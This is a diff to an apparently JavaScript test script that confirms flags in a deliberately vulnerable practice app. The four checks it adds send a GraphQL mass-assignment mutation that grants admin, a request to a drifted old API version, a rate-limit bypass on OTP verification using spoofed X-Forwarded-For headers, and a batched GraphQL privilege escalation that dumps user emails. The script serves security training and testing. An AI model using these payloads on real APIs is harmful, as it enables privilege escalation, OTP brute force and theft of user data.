@@ -234,6 +234,14 @@ const oobTok = 'tok' + Date.now();
 ok(66, 'signing_oracle', (await txt('/api/sign', J({ data: 'anything' }))).body.includes('lj_signing_oracle'));
 ok(67, 'weak_crypto_ecb', (await txt('/api/seal', J({ data: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' }))).body.includes('lj_aes_ecb_pattern_leak'));
 
+// ─────────────────────── v10 API BOSS ───────────────────────
+ok(68, 'gql_mass_assign', (await txt('/graphql', J({ query: 'mutation { updateProfile(id:5, role:"admin", isAdmin:true){ id role } }' }))).body.includes('lj_graphql_mass_assignment'));
+ok(69, 'api_inventory_drift', (await txt('/api/v1/orders/40901')).body.includes('lj_api_inventory_drift'));
+{ let hit = false;
+  for (let i = 0; i < 7; i++) { const b = (await txt('/api/otp/verify', { ...J({ code: '000' }), headers: { 'content-type': 'application/json', 'x-forwarded-for': '10.0.0.' + i } })).body; if (b.includes('lj_ratelimit_xff_bypass')) hit = true; }
+  ok(70, 'ratelimit_bypass_xff', hit); }
+ok(71, 'gql_batch_privesc', (await txt('/graphql', J({ query: 'mutation { a:mintPoints(userId:5, amount:1){id} b:adminDumpUsers{email} }' }))).body.includes('lj_graphql_batch_privesc'));
+
 const passed = results.filter((r) => r.pass).length;
 for (const r of results) console.log(`${r.pass ? '✅' : '❌'}  #${String(r.id).padStart(2)}  ${r.name}`);
 console.log(`\n${passed}/${results.length} challenges captured.`);
